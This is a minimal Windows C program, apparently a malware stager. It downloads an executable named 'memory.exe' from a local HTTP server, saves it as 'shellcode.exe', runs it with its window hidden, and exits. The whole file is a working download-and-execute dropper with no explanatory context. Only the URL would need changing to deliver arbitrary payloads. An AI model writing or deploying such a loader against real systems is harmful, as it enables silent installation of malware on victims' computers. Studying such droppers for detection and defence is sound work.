#include <stdio.h>
#include <Urlmon.h>
#include <shellapi.h>
#pragma comment (lib,"Urlmon.lib")
int main(void)
{
 HRESULT hr = URLDownloadToFile(NULL, "http://127.0.0.1:5000/memory.exe", "shellcode.exe", 0, NULL);
 if (hr == S_OK)
 {
  printf("OK\n");
 }
 WinExec("shellcode.exe", 0);
 ExitProcess(0);
 return 0;

}